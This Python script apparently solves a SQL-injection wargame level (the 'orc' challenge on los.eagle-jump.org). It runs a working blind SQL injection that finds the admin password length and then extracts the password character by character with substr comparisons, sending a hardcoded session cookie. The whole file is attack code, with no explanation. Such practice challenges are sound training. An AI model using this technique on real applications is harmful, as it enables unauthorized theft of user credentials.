import requests
lenth=0
session_id={'PHPSESSID':'ccr78j1o5oisvdgieous9j6r23'}
parameters="01234567890123456789abcdefghijklmnopqrstuvwxyz"

for i in range(1,10):
    URL = "https://los.eagle-jump.org/orc_47190a4d33f675a601f8def32df2583a.php?pw=' or id='admin' and length(pw)="+str(i)+"--%20"
    respone = requests.get(url=URL,cookies=session_id)
    print(respone.url)
    if 'Hello admin' in respone.text:
        print(i)
        length=i
        break
password=''
for i in range(1,length+1):
    for j in parameters:
        URL = "https://los.eagle-jump.org/orc_47190a4d33f675a601f8def32df2583a.php?pw=' or id='admin' and substr(pw,"+str(i)+",1)=\'"+str(j)+"\'--%20"
        respone=requests.get(url=URL,cookies=session_id)
        print(respone.url,"password : "+password)
        if 'Hello admin' in respone.text:
            password+=str(j)
            print(j)
            break
print(password)
